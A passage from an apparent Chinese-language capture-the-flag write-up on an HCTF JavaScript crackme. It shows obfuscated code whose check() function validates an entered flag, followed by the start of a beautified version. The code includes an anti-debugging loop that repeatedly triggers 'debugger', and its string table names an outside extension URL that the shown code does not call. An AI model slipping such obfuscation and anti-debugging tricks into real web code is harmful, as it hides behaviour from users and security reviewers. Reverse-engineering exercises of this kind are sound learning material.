function_">_0xa180</span>(<span class="string">&#x27;0x16&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x17&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x18&#x27;</span>),<span class="string">&#x27;tabs&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x19&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1a&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1b&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1c&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1d&#x27;</span>),<span class="string">&#x27;replace&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1e&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1f&#x27;</span>),<span class="string">&#x27;includes&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x20&#x27;</span>),<span class="string">&#x27;length&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x21&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x22&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x23&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x24&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x26&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x27&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x28&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x29&#x27;</span>),<span class="string">&#x27;toString&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2a&#x27;</span>),<span class="string">&#x27;split&#x27;</span>];<span class="keyword">var</span> _0x50559f=_0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>,<span class="number">0x4</span>);<span class="keyword">var</span> _0x5cea12=<span class="built_in">parseInt</span>(<span class="title function_">btoa</span>(_0x50559f),<span class="number">0x20</span>);<span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">_0x200db2,_0x177f13,_0x46da6f,_0x802d91,_0x2d59cf,_0x2829f2</span>)&#123;_0x2d59cf=<span class="keyword">function</span>(<span class="params">_0x4be75f</span>)&#123;<span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(_0x46da6f--)_0x2829f2[<span class="title function_">_0x2d59cf</span>(_0x46da6f)]=_0x802d91[_0x46da6f]||<span class="title function_">_0x2d59cf</span>(_0x46da6f);_0x802d91=[<span class="keyword">function</span>(<span class="params">_0x5e8f1a</span>)&#123;<span class="keyword">return</span> _0x2829f2[_0x5e8f1a];&#125;];_0x2d59cf=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2b&#x27;</span>);&#125;;_0x46da6f=<span class="number">0x1</span>;&#125;;<span class="keyword">while</span>(_0x46da6f--)<span class="keyword">if</span>(_0x802d91[_0x46da6f])_0x200db2=_0x200db2[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span>+<span class="title function_">_0x2d59cf</span>(_0x46da6f)+<span class="string">&#x27;\x5cb&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),_0x802d91[_0x46da6f]);<span class="keyword">return</span> _0x200db2;&#125;(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2d&#x27;</span>),<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),<span class="number">0x0</span>,&#123;&#125;));(<span class="keyword">function</span>(<span class="params">_0x3291b7,_0xced890</span>)&#123;<span class="keyword">var</span> _0xaed809=<span class="keyword">function</span>(<span class="params">_0x3aba26</span>)&#123;<span class="keyword">while</span>(--_0x3aba26)&#123;_0x3291b7[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="title function_">_0xaed809</span>(++_0xced890);&#125;(_0x2e2f8d,_0x5cea12%<span class="number">0x7b</span>));<span class="keyword">var</span> _0x43c8d1=<span class="keyword">function</span>(<span class="params">_0x3120e0</span>)&#123;<span class="keyword">var</span> _0x3120e0=<span class="built_in">parseInt</span>(_0x3120e0,<span class="number">0x10</span>);<span class="keyword">var</span> _0x3a882f=_0x2e2f8d[_0x3120e0];<span class="keyword">return</span> _0x3a882f;&#125;;<span class="keyword">var</span> _0x1c3854=<span class="keyword">function</span>(<span class="params">_0x52ba71</span>)&#123;<span class="keyword">var</span> _0x52b956=<span class="string">&#x27;0x&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x59c050=<span class="number">0x0</span>;_0x59c050&lt;_0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];_0x59c050++)&#123;_0x52b956+=_0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[<span class="title function_">_0x43c8d1</span>(<span class="number">0xc</span>)](<span class="number">0x10</span>);&#125;<span class="keyword">return</span> _0x52b956;&#125;;<span class="keyword">var</span> _0x76e1e8=_0x5b7c0c[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);<span class="keyword">var</span> _0x34f55b=(<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>,<span class="number">0x2</span>))^<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)))%_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]==<span class="number">0x5</span>;<span class="keyword">if</span>(!_0x34f55b)&#123;<span class="keyword">return</span>![];&#125;b2c=<span class="keyword">function</span>(<span class="params">_0x3f9bc5</span>)&#123;<span class="keyword">var</span> _0x3c3bd8=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;<span class="keyword">var</span> _0x4dc510=[];<span class="keyword">var</span> _0x4a199f=<span class="title class_">Math</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]/<span class="number">0x5</span>);<span class="keyword">var</span> _0x4ee491=_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]%<span class="number">0x5</span>;<span class="keyword">if</span>(_0x4ee491!=<span class="number">0x0</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> _0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;<span class="number">0x5</span>-_0x4ee491;_0x1e1753++)&#123;_0x3f9bc5+=<span class="string">&#x27;&#x27;</span>;&#125;_0x4a199f+=<span class="number">0x1</span>;&#125;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x4a199f;_0x1e1753++)&#123;_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&gt;&gt;<span class="number">0x3</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&amp;<span class="number">0x7</span>)&lt;&lt;<span class="number">0x2</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&gt;&gt;<span class="number">0x6</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x3f</span>)&gt;&gt;<span class="number">0x1</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x1</span>)&lt;&lt;<span class="number">0x4</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&gt;&gt;<span class="number">0x4</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">0x1</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&gt;&gt;<span class="number">0x7</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x7f</span>)&gt;&gt;<span class="number">0x2</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">0x3</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&gt;&gt;<span class="number">0x5</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&amp;<span class="number">0x1f</span>));&#125;<span class="keyword">var</span> _0x545c12=<span class="number">0x0</span>;<span class="keyword">if</span>(_0x4ee491==<span class="number">0x1</span>)_0x545c12=<span class="number">0x6</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x2</span>)_0x545c12=<span class="number">0x4</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x3</span>)_0x545c12=<span class="number">0x3</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x4</span>)_0x545c12=<span class="number">0x1</span>;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2f&#x27;</span>)]();<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);(<span class="keyword">function</span>(<span class="params"></span>)&#123;(<span class="keyword">function</span> <span class="title function_">_0x3c3bd8</span>(<span class="params"></span>)&#123;<span class="keyword">try</span>&#123;(<span class="keyword">function</span> <span class="title function_">_0x4dc510</span>(<span class="params">_0x460a91</span>)&#123;<span class="keyword">if</span>((<span class="string">&#x27;&#x27;</span>+_0x460a91/_0x460a91)[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x30&#x27;</span>)]!==<span class="number">0x1</span>||_0x460a91%<span class="number">0x14</span>===<span class="number">0x0</span>)&#123;(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());&#125;<span class="keyword">else</span>&#123;<span class="keyword">debugger</span>;&#125;<span class="title function_">_0x4dc510</span>(++_0x460a91);&#125;(<span class="number">0x0</span>));&#125;<span class="keyword">catch</span>(_0x30f185)&#123;<span class="built_in">setTimeout</span>(_0x3c3bd8,<span class="number">0x1388</span>);&#125;&#125;());&#125;());<span class="keyword">return</span> _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);&#125;;e=<span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x2</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^<span class="number">0x53a3f32</span>;<span class="keyword">if</span>(e!=<span class="number">0x4b7c0a73</span>)&#123;<span class="keyword">return</span>![];&#125;f=<span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x3</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^e;<span class="keyword">if</span>(f!=<span class="number">0x4315332</span>)&#123;<span class="keyword">return</span>![];&#125;n=f*e*_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];h=<span class="keyword">function</span>(<span class="params">_0x4c466e,_0x28871</span>)&#123;<span class="keyword">var</span> _0x3ea581=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x2fbf7a=<span class="number">0x0</span>;_0x2fbf7a&lt;_0x4c466e[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];_0x2fbf7a++)&#123;_0x3ea581+=<span class="title function_">_0x28871</span>(_0x4c466e[_0x2fbf7a]);&#125;<span class="keyword">return</span> _0x3ea581;&#125;;j=_0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);<span class="keyword">if</span>(j[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]!=j[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]||(<span class="title function_">_0x1c3854</span>(j[<span class="number">0x0</span>])^<span class="title function_">_0x1c3854</span>(j[<span class="number">0x1</span>]))!=<span class="number">0x1613</span>)&#123;<span class="keyword">return</span>![];&#125;k=<span class="function"><span class="params">_0xffcc52</span>=&gt;</span>_0xffcc52[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];l=<span class="title function_">h</span>(j[<span class="number">0x0</span>],k);<span class="keyword">if</span>(l!=<span class="number">0x2f9b5072</span>)&#123;<span class="keyword">return</span>![];&#125;m=<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x0</span>,<span class="number">0x4</span>))-<span class="number">0x48a05362</span>==n%l;<span class="keyword">function</span> <span class="title function_">_0x5a6d56</span>(<span class="params">_0x5a25ab,_0x4a4483</span>)&#123;<span class="keyword">var</span> _0x55b09f=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x508ace=<span class="number">0x0</span>;_0x508ace&lt;_0x4a4483;_0x508ace++)&#123;_0x55b09f+=_0x5a25ab;&#125;<span class="keyword">return</span> _0x55b09f;&#125;<span class="keyword">if</span>(!m||<span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x5</span>,<span class="number">0x1</span>),<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x5</span>,<span class="number">0x4</span>)||_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>,<span class="number">0x1</span>)-_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)!=<span class="number">0x1</span>)&#123;<span class="keyword">return</span>![];&#125;o=<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>))[<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x1</span>)[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]*<span class="number">0x5</span>;<span class="keyword">return</span> o&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)==<span class="number">0x2</span>&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>)==<span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x7</span>,<span class="number">0x1</span>),<span class="number">0x2</span>);&#125;<span class="keyword">catch</span>(_0x4cbb89)&#123;<span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);<span class="keyword">return</span>![];&#125;&#125;<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x5bf136=<span class="variable language_">document</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x32&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];<span class="keyword">if</span>(_0x5bf136==<span class="string">&#x27;&#x27;</span>)&#123;<span class="variable language_">console</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x34&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x35&#x27;</span>));<span class="keyword">return</span>![];&#125;<span class="keyword">var</span> _0x4d0e29=<span class="title function_">check</span>(_0x5bf136);<span class="keyword">if</span>(_0x4d0e29)&#123;<span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x36&#x27;</span>));&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x37&#x27;</span>));&#125;&#125;<span class="variable language_">window</span>[<span class="string">&#x27;onload&#x27;</span>]=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="built_in">setInterval</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x38&#x27;</span>),<span class="number">0x32</span>);<span class="title function_">test</span>();&#125;;</span><br></pre></td></tr></table></figure>

<p>美化一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="keyword">function</span> (<span class="params">_0x1661d3</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">_0x5e3956</span>(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) &#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    <span class="keyword">return</span> _0x26f3b3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">_0x5b7c0c</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> 